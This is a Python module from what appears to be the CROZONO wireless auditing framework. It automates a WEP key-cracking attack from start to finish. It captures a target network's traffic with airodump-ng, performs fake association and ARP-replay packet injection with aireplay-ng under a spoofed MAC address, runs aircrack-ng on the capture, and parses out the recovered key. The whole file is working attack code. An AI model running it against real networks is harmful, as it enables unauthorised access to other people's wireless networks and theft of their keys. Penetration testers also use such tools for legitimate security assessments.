#!/usr/bin/env python3
"""
--------------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com

	WLAN - WEP attack module - Association & Injection
--------------------------------------------------------------------------------

"""
__PRIORITY__ = 0

import os
import time
import pexpect
import subprocess
import src.settings as settings

from subprocess import Popen
from poormanslogging import info, error, warn
from src.attacks.base_attack import BaseAttack

class wep_injection(BaseAttack):

	def __init__(self, p):
		pass

	def run(self):
		proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', settings.TARGET_BSSID, '-c', settings.TARGET_CHANNEL, '-w', 'cr0z0n0_attack', settings.INTERFACE_MON],
							stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		info("Running an association & packet injection attack")
		cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(settings.TARGET_ESSID, settings.TARGET_BSSID, settings.NEW_MAC, settings.INTERFACE_MON))
		cmd_auth.logfile = open(settings.LOG_FILE, 'wb')
		cmd_auth.expect(['Association successful', pexpect.TIMEOUT, pexpect.EOF], 20)
		cmd_auth.close()
		parse_log_auth = open(settings.LOG_FILE, 'r')
		for line in parse_log_auth:
			if line.find('Association successful') != -1:
				info("Association successful :-) injecting packets...")
		parse_log_auth.close()
		os.remove(settings.LOG_FILE)

		proc_aireplay = subprocess.Popen(['aireplay-ng', '-3', '-e', '"' + settings.TARGET_ESSID + '"', '-b', settings.TARGET_BSSID, '-h', settings.NEW_MAC, settings.INTERFACE_MON],
							stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		time.sleep(settings.WEP_AIREPLAY_TIME)

		cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
		cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
		cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], 30)
		cmd_crack.close()

		parse_log_crack = open(settings.LOG_FILE, 'r')
		for line in parse_log_crack:
			wh = line.find('KEY FOUND!')
			if wh > -1:
				if 'ASCII' in line:
					wh2 = line.find('ASCII')
					key_start = 'ASCII('
					key_end = line.find(')')
					settings.TARGET_KEY = line[wh2 + len(key_start):key_end]
				else:
					key_start = 'KEY FOUND!'
					key_end = line.find(']')
					settings.TARGET_KEY = line[wh + len(key_start):key_end].strip() # 13 (?)
		parse_log_crack.close()
		os.remove(settings.LOG_FILE)
		if settings.TARGET_KEY is None:
			warn("Attack failed!")

	def setup(self):
		#  Delete old files:
		if os.path.exists(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.csv')):
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.csv'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.cap'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.kismet.csv'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.kismet.netxml'))

	def check(self):
		dep = 'aircrack-ng'
		if subprocess.call(["which", dep],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
			error("Required binary for {bin} not found.".format(bin=dep))
			return False
		else:
			return True
